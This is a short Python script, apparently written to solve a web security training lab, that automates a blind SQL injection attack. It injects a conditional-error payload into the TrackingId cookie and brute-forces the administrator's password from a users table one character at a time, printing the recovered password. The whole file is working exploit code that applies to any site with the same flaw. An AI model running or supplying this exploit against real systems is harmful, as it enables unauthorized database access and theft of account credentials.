```python
import requests
import sys
import time

dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def findPass(tracking_id, sess_cookie, url):
    pwd = ""
    index = 1
    while True:
        found_char = False
        print(f"[-] Index : {index}")
        for char in dic:
            payload = tracking_id + "' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), "+str(index)+",1) = '"+char+"') THEN to_char(1/0) ELSE 'a' END FROM Dual)='a"
            response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
            if "Internal Server Error" in response.text:
                pwd += char
                print(f"{pwd}")
                found_char = True
                break
            time.sleep(1)
        index += 1
        if not found_char:
            print("[+] Possibly we hit EOP (End Of Password) :)")
            print(f"[+] Possible Password : {pwd}")
            break
    return pwd

def getCookies(url):
    response = requests.get(url)
    return response.cookies["TrackingId"], response.cookies["session"]

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

if __name__=="__main__":
    tracking_id, sess_cookie = getCookies(URL)
    print(f"[+] Tracking Id : {tracking_id}")
    print(f"[+] Session cookie : {sess_cookie}")
    
    findPass(tracking_id, sess_cookie, URL)
```